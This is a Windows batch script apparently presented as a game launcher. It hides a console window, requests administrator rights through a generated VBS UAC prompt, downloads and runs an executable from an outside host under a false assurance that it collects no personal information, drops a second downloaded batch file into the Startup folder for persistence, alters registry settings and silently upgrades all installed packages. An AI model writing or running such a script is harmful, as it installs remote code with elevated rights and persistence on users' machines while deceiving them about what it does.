@echo off

cmd /c powershell -Nop -NonI -Nologo -WindowStyle Hidden "Write-Host"

:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------

curl "https://assets.spacegamedev.com/projects/Charles.exe" --output "Charles.exe"

powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name AppsUseLightTheme -Value 0"

powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0"

echo Gathering debug information for this system, it does not collect personal information, just system specifications.

:: START THE GAME FROM HERE!

Charles sysinfo

curl "https://spacegamedev-assets.pages.dev/scripts/autotheme.bat" --output "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\autorestore.bat"

echo Winget Packages determined to be out of date. Upgrading them for performance and security reasons.

echo y|winget upgrade --all